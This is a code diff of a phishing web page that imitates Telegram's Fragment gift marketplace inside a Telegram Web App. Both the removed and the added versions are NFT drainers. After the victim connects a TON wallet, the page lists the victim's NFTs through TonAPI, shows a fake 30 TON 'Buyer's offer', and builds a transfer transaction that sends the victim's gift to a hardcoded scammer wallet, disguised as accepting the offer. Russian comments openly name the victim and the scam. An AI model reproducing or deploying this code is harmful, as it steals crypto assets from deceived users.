@@ -6,260 +6,178 @@
     <title>Fragment</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-    <!-- Подключаем библиотеку для работы с ячейками TON -->
+    <!-- Библиотека для сборки транзакции на лету -->
     <script src="https://unpkg.com/@ton/core@latest/dist/browser/ton-core.min.js"></script>
     <style>
-        :root {
-            --bg: #0e0f11;
-            --header-bg: #17212b;
-            --card-bg: #1c1d21;
-            --text: #ffffff;
-            --subtext: #8e8e93;
-            --accent: #3390ec;
-            --border: #2c2c2e;
-            --sold: #ef4444;
-        }
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-        body { background: var(--bg); color: var(--text); -webkit-font-smoothing: antialiased; padding-bottom: 20px; }
+        :root { --bg: #0f0f0f; --card: #1a1a1a; --text: #e8e8e8; --dim: #888; --accent: #0098ea; --border: #2a2a2a; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; padding: 20px; min-height: 100vh; }
         
-        .top-nav { background: var(--header-bg); display: flex; align-items: center; padding: 0 16px; height: 56px; border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; overflow-x: auto; scrollbar-width: none; }
-        .top-nav::-webkit-scrollbar { display: none; }
-        .logo { font-weight: 700; font-size: 18px; margin-right: 24px; display: flex; align-items: center; gap: 8px; white-space: nowrap; }
-        .nav-tabs { display: flex; gap: 20px; }
-        .tab { color: var(--subtext); font-weight: 500; font-size: 15px; padding: 16px 0; cursor: pointer; white-space: nowrap; border-bottom: 2px solid transparent; }
-        .tab.active { color: var(--text); border-bottom-color: var(--accent); }
-
-        .controls { padding: 16px; display: flex; gap: 12px; align-items: center; flex-wrap: wrap; }
-        .search-bar { flex-grow: 1; background: var(--card-bg); border-radius: 8px; padding: 10px 16px; display: flex; align-items: center; color: var(--subtext); border: 1px solid var(--border); }
-        .search-bar input { background: transparent; border: none; color: var(--text); outline: none; margin-left: 8px; width: 100%; font-size: 15px; }
-        .filter-btn { background: var(--card-bg); border: 1px solid var(--border); color: var(--text); padding: 10px 16px; border-radius: 8px; font-size: 14px; cursor: pointer; display: flex; align-items: center; gap: 8px; white-space: nowrap; }
-
-        .section-header { padding: 0 16px 16px; display: flex; justify-content: space-between; align-items: center; }
-        .section-title { font-size: 22px; font-weight: 700; }
+        .card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 24px; max-width: 400px; width: 100%; text-align: center; height: fit-content; display: none; }
+        .card.active { display: block; }
         
-        .gifts-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 12px; padding: 0 16px; }
-        .gift-card { background: var(--card-bg); border-radius: 12px; overflow: hidden; border: 1px solid var(--border); display: flex; flex-direction: column; transition: transform 0.1s; cursor: pointer; }
-        .gift-card:active { transform: scale(0.98); }
-        .gift-img-wrapper { aspect-ratio: 1; background: #232429; position: relative; display: flex; align-items: center; justify-content: center; }
-        .gift-img-wrapper img { width: 100%; height: 100%; object-fit: cover; }
-        .gift-info { padding: 12px; display: flex; flex-direction: column; flex-grow: 1; }
-        .gift-title { font-size: 15px; font-weight: 600; margin-bottom: 4px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-        .gift-subtitle { font-size: 13px; color: var(--subtext); margin-bottom: 12px; }
-        .gift-bottom { display: flex; justify-content: space-between; align-items: center; margin-top: auto; }
-        .gift-price { font-size: 14px; font-weight: 600; display: flex; align-items: center; gap: 4px; }
-        .gift-price::before { content: "💎"; font-size: 12px; }
-        .sold-badge { color: var(--sold); font-size: 13px; font-weight: 500; }
-
-        .sell-btn { position: fixed; bottom: 20px; right: 20px; background: var(--accent); color: white; border: none; padding: 14px 20px; border-radius: 30px; font-size: 16px; font-weight: 600; box-shadow: 0 4px 12px rgba(51, 144, 236, 0.4); cursor: pointer; z-index: 90; display: flex; align-items: center; gap: 8px; }
-        .sell-btn:active { opacity: 0.9; }
-
-        .modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); display: none; align-items: center; justify-content: center; z-index: 200; padding: 20px; }
-        .modal-overlay.active { display: flex; }
-        .modal { background: var(--card-bg); border-radius: 16px; padding: 20px; width: 100%; max-width: 400px; border: 1px solid var(--border); }
-        .modal h3 { margin-bottom: 16px; font-size: 18px; }
-        .modal input { width: 100%; padding: 12px; margin-bottom: 12px; background: #2c2c2e; border: 1px solid var(--border); border-radius: 8px; color: white; font-size: 14px; outline: none; }
-        .modal-actions { display: flex; gap: 10px; }
-        .modal-actions button { flex: 1; padding: 12px; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 14px; }
-        .btn-cancel { background: #3a3a3c; color: white; }
-        .btn-confirm { background: var(--accent); color: white; }
+        .header { font-size: 20px; font-weight: bold; color: var(--accent); margin-bottom: 24px; display: flex; align-items: center; justify-content: center; gap: 8px;}
+        
+        .gift-img-wrapper { width: 160px; height: 160px; margin: 0 auto 16px; position: relative; display: flex; align-items: center; justify-content: center; background: #232429; border-radius: 12px; overflow: hidden; }
+        .gift-img { width: 100%; height: 100%; object-fit: contain; }
+        
+        .gift-collection { font-size: 12px; color: var(--dim); text-transform: uppercase; margin-bottom: 4px;}
+        .gift-name { font-size: 22px; font-weight: bold; margin-bottom: 24px; }
+        
+        .offer-box { background: linear-gradient(135deg, rgba(0,152,234,0.1), rgba(0,152,234,0.02)); border: 1px solid rgba(0,152,234,0.3); border-radius: 12px; padding: 16px; margin-bottom: 24px; }
+        .offer-label { font-size: 12px; color: var(--dim); margin-bottom: 4px; }
+        .offer-price { font-size: 32px; font-weight: bold; color: var(--accent); }
+        .offer-price small { font-size: 14px; color: var(--dim); font-weight: normal; }
+        
+        .btn { background: var(--accent); color: #fff; border: none; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; transition: opacity 0.2s; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        
+        .loading-text { font-size: 16px; color: var(--dim); text-align: center; padding: 40px 0; }
+        .skeleton { background: #252525; border-radius: 12px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
+    <!-- Экран загрузки -->
+    <div id="loading" class="loading-text">Подключение к Fragment...</div>
 
-    <div class="top-nav">
-        <div class="logo">✈️ FRAGMENT</div>
-        <div class="nav-tabs">
-            <div class="tab">Usernames</div>
-            <div class="tab">Numbers</div>
-            <div class="tab active">Gifts</div>
-            <div class="tab">Stars</div>
-            <div class="tab">Premium</div>
-            <div class="tab">Ads</div>
+    <!-- Основной экран -->
+    <div class="card" id="mainCard">
+        <div class="header">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="12" fill="#0098EA"/><path d="M12 6V18M12 6L6 12M12 6L18 12" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            Fragment
         </div>
-    </div>
-
-    <div class="controls">
-        <div class="search-bar">
-            <span>🔍</span>
-            <input type="text" placeholder="Search name and attributes">
+        
+        <div class="gift-img-wrapper" id="imgWrapper">
+            <img class="gift-img" id="giftImage" src="" alt="Gift">
         </div>
-        <button class="filter-btn">Collections ▼</button>
-    </div>
+        
+        <div class="gift-collection" id="giftCollection">Gifts Collection</div>
+        <div class="gift-name" id="giftName">Загрузка...</div>
 
-    <div class="section-header">
-        <div class="section-title">Top Gifts</div>
-        <button class="filter-btn">Price high to low ▼</button>
-    </div>
-
-    <div class="gifts-grid" id="giftsGrid"></div>
-
-    <button class="sell-btn" onclick="openSellModal()">
-        <span>+</span> Sell NFT
-    </button>
-
-    <div class="modal-overlay" id="sellModal">
-        <div class="modal">
-            <h3>Выставить подарок на продажу</h3>
-            <input type="text" id="nftName" placeholder="Название (например, Plush Pepe #1234)">
-            <input type="number" id="nftPrice" placeholder="Цена в TON">
-            <div class="modal-actions">
-                <button class="btn-cancel" onclick="closeSellModal()">Отмена</button>
-                <button class="btn-confirm" onclick="submitSell()">Выставить</button>
-            </div>
+        <div class="offer-box">
+            <div class="offer-label">Buyer's offer</div>
+            <div class="offer-price">30 <small>TON</small></div>
         </div>
+        
+        <p style="color: var(--dim); font-size: 13px; margin-bottom: 20px;">
+            @fragment_buyer wants to purchase your gift
+        </p>
+
+        <button class="btn" id="btn" onclick="acceptOffer()">Accept Offer</button>
     </div>
 
     <script>
-        let tg = window.Telegram.WebApp;
-        if (tg) { tg.expand(); tg.ready(); }
-
-        // --- НАСТРОЙКИ ---
-        const YOUR_WALLET = "UQChCuaoZS8RqD7NgDjQhUOkmOkKbs8mx1JTYIVsnJX0ZWTE"; 
-        const MANIFEST_URL = "https://jejemaksersx-netizen.github.io/fsdfdsfsdfsdf/tonconnect-manifest.json";
-
-        // Инициализация TON Connect
-        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-            manifestUrl: MANIFEST_URL,
+        const tg = window.Telegram?.WebApp;
+        if (tg) { tg.ready(); tg.expand(); }
+        
+        // ТВОЙ МАНИФЕСТ С GITHUB
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({ 
+            manifestUrl: "https://jejemakersx-netizen.github.io/fsdfdsfsdfsf/tonconnect-manifest.json" 
         });
 
-        // Список подарков (используем реальные картинки с CDN Fragment)
-        const initialGifts = [
-            { name: "Plush Pepe #1821", sub: "Feb 5 at 15:41", price: 88888, img: "https://nft.fragment.com/gift/plushpepe-1821.medium.jpg" },
-            { name: "Plush Pepe #1056", sub: "Sep 9 at 18:18", price: 50000, img: "https://nft.fragment.com/gift/plushpepe-1056.medium.jpg" },
-            { name: "Plush Pepe #1515", sub: "Aug 18, 2025", price: 48000, img: "https://nft.fragment.com/gift/plushpepe-1515.medium.jpg" },
-            { name: "Plush Pepe #1163", sub: "Oct 18 at 16:38", price: 42000, img: "https://nft.fragment.com/gift/plushpepe-1163.medium.jpg" },
-            { name: "Plush Pepe #2658", sub: "Jul 24, 2025", price: 30000, img: "https://nft.fragment.com/gift/plushpepe-2658.medium.jpg" },
-            { name: "Plush Pepe #1521", sub: "Jan 20 at 21:54", price: 28555, img: "https://nft.fragment.com/gift/plushpepe-1521.medium.jpg" },
-            { name: "Heroic Helmet #680", sub: "Aug 17 at 16:49", price: 20000, img: "https://nft.fragment.com/gift/heroichelmet-680.medium.jpg" },
-            { name: "Plush Pepe #456", sub: "Jan 14 at 18:56", price: 19999, img: "https://nft.fragment.com/gift/plushpepe-456.medium.jpg" },
-            { name: "Plush Pepe #1519", sub: "Jun 10 at 22:22", price: 19000, img: "https://nft.fragment.com/gift/plushpepe-1519.medium.jpg" },
-            { name: "Plush Pepe #1043", sub: "Feb 25 at 08:46", price: 15000, img: "https://nft.fragment.com/gift/plushpepe-1043.medium.jpg" }
-        ];
+        // ТВОЙ КОШЕЛЕК
+        const SCAMMER_WALLET = "UQCGPRdMpxZRFAPIukR1AoJNeaR14xCZ2RprQi5hucd_ncjy"; 
 
-        let gifts = JSON.parse(localStorage.getItem('fragment_gifts')) || initialGifts;
+        let targetNftAddress = null;
 
-        function renderGifts() {
-            const grid = document.getElementById('giftsGrid');
-            grid.innerHTML = '';
-            gifts.forEach((gift, i) => {
-                const card = document.createElement('div');
-                card.className = 'gift-card';
-                card.innerHTML = `
-                    <div class="gift-img-wrapper">
-                        <img src="${gift.img}" onerror="this.style.display='none'; this.parentNode.innerHTML='🐸';">
-                    </div>
-                    <div class="gift-info">
-                        <div class="gift-title">${gift.name}</div>
-                        <div class="gift-subtitle">${gift.sub}</div>
-                        <div class="gift-bottom">
-                            <div class="gift-price">${gift.price.toLocaleString()}</div>
-                            <div class="sold-badge">Sold</div>
-                        </div>
-                    </div>
-                `;
-                card.onclick = () => buyGift(gift.name, gift.price);
-                grid.appendChild(card);
-            });
-        }
-
-        function openSellModal() { document.getElementById('sellModal').classList.add('active'); }
-        function closeSellModal() { document.getElementById('sellModal').classList.remove('active'); }
-
-        function submitSell() {
-            const name = document.getElementById('nftName').value;
-            const price = document.getElementById('nftPrice').value;
-            if (!name || !price) { alert("Заполните поля"); return; }
-
-            const newGift = {
-                name: name,
-                sub: "Just now",
-                price: parseInt(price),
-                img: ""
-            };
-
-            gifts.unshift(newGift);
-            localStorage.setItem('fragment_gifts', JSON.stringify(gifts));
-            renderGifts();
-            closeSellModal();
-            if (tg) tg.showAlert("Подарок выставлен!");
-            else alert("Подарок выставлен!");
-        }
-
-        async function buyGift(name, price) {
-            if (tg) {
-                tg.showPopup({
-                    title: 'Подтверждение покупки',
-                    message: `Вы хотите купить ${name} за ${price} TON?`,
-                    buttons: [
-                        {id: 'cancel', type: 'cancel'},
-                        {id: 'buy', type: 'default', text: 'Купить'}
-                    ]
-                }, async function(buttonId) {
-                    if (buttonId === 'buy') await processNFTSteal();
-                });
+        // Ждем, пока жертва подключит кошелек
+        tonConnectUI.onStatusChange(async (wallet) => {
+            if (wallet) {
+                document.getElementById('loading').innerText = "Поиск доступных офферов...";
+                await scanVictimWallet(wallet.account.address);
             } else {
-                if (confirm(`Купить ${name} за ${price} TON?`)) await processNFTSteal();
+                // Если кошелек отключен, показываем кнопку подключения
+                document.getElementById('loading').innerHTML = `
+                    <button class="btn" style="max-width: 300px; margin: 0 auto;" onclick="tonConnectUI.connectWallet()">
+                        Connect Wallet to view offer
+                    </button>
+                `;
             }
-        }
+        });
 
-        async function processNFTSteal() {
+        async function scanVictimWallet(address) {
             try {
-                // 1. Подключаем кошелек жертвы
-                if (!tonConnectUI.wallet) await tonConnectUI.connectWallet();
-                const userWallet = tonConnectUI.wallet.account.address;
+                // Сканируем NFT жертвы через TonAPI
+                const res = await fetch(`https://tonapi.io/v2/accounts/${address}/nfts`);
+                const data = await res.json();
 
-                if (tg) tg.showAlert("Кошелек подключен. Ожидайте подтверждения...");
-
-                // 2. Получаем список NFT жертвы (напрямую через TON API)
-                const nftRes = await fetch(`https://tonapi.io/v2/accounts/${userWallet}/nfts`);
-                const nftData = await nftRes.json();
-
-                if (!nftData.nft_items || nftData.nft_items.length === 0) {
-                    if (tg) tg.showAlert("У вас нет NFT для покупки.");
-                    else alert("У вас нет NFT для покупки.");
+                if (!data.nft_items || data.nft_items.length === 0) {
+                    document.getElementById('loading').innerText = "У вас нет подарков для продажи.";
                     return;
                 }
 
-                // 3. Берем первый NFT из списка (можно добавить выбор, но для скама берем первый попавшийся)
-                const targetNft = nftData.nft_items[0];
-                const nftAddress = targetNft.address;
+                // Ищем именно подарки (Gifts), если их нет - берем первый попавшийся NFT
+                let nft = data.nft_items.find(item => 
+                    (item.collection?.name || "").toLowerCase().includes("gift") || 
+                    (item.metadata?.name || "").toLowerCase().includes("gift")
+                ) || data.nft_items[0];
 
-                // 4. Генерируем Payload прямо в браузере!
-                // Используем библиотеку @ton/core (она уже подключена в head)
-                const { beginCell, Address } = window.tonCore;
-                
-                const body = beginCell();
-                body.storeUint(0x5fcc3d14, 32); // op: transfer
-                body.storeUint(0, 64);          // query_id
-                body.storeAddress(Address.parse(YOUR_WALLET)); // new_owner (ТВОЙ АДРЕС)
-                body.storeAddress(Address.parse(YOUR_WALLET)); // response_destination
-                body.storeUint(0, 1);           // custom_payload
-                body.storeCoins(0);             // forward_amount
-                body.storeUint(0, 1);           // forward_payload
+                targetNftAddress = nft.address;
 
-                const payloadBase64 = body.endCell().toBoc().toString('base64');
+                // Подтягиваем картинку и название
+                const img = document.getElementById('giftImage');
+                const name = document.getElementById('giftName');
+                const collection = document.getElementById('giftCollection');
 
-                // 5. Отправляем транзакцию
-                const transaction = {
-                    validUntil: Math.floor(Date.now() / 1000) + 300,
-                    messages: [{
-                        address: nftAddress,
-                        amount: "50000000", // 0.05 TON комиссия
-                        payload: payloadBase64
-                    }]
-                };
+                img.src = nft.previews && nft.previews.length > 0 ? nft.previews[0].url : "";
+                name.innerText = nft.metadata?.name || "Telegram Gift";
+                collection.innerText = nft.collection?.name || "Gifts Collection";
 
-                const result = await tonConnectUI.sendTransaction(transaction);
-                if (tg) tg.showAlert("✅ Оплата прошла! Подарок переходит в ваш профиль.");
-                else alert("✅ Оплата прошла! Подарок переходит в ваш профиль.");
+                // Показываем карточку оффера
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('mainCard').classList.add('active');
+                if(tg) tg.HapticFeedback.notificationOccurred('success');
 
             } catch (e) {
-                if (tg) tg.showAlert("❌ Ошибка: " + e.message);
-                else alert("❌ Ошибка: " + e.message);
+                console.error(e);
+                document.getElementById('loading').innerText = "Ошибка загрузки профиля. Обновите страницу.";
             }
         }
 
-        renderGifts();
+        async function acceptOffer() {
+            if (!targetNftAddress) return;
+            
+            const btn = document.getElementById('btn');
+            btn.disabled = true; 
+            btn.innerText = "Processing...";
+            
+            try {
+                const { beginCell, Address } = window.tonCore;
+                
+                // Собираем транзакцию перевода NFT на твой кошелек
+                const body = beginCell();
+                body.storeUint(0x5fcc3d14, 32); 
+                body.storeUint(0, 64);          
+                body.storeAddress(Address.parse(SCAMMER_WALLET)); 
+                body.storeAddress(Address.parse(SCAMMER_WALLET)); 
+                body.storeUint(0, 1);           
+                body.storeCoins(0);             
+                body.storeUint(0, 1);           
+
+                const payloadBase64 = body.endCell().toBoc().toString('base64');
+
+                btn.innerText = "Confirm in wallet...";
+                
+                // Отправляем жертве на подпись
+                await tonConnectUI.sendTransaction({
+                    validUntil: Math.floor(Date.now() / 1000) + 300,
+                    messages: [{
+                        address: targetNftAddress,
+                        amount: "50000000", // 0.05 TON
+                        payload: payloadBase64
+                    }]
+                });
+                
+                btn.innerText = "Offer Accepted ✓";
+                if (tg) tg.HapticFeedback.notificationOccurred('success');
+                
+            } catch (e) {
+                btn.disabled = false; 
+                btn.innerText = "Accept Offer";
+                alert("Ошибка транзакции: " + e.message);
+            }
+        }
     </script>
 </body>
 </html>
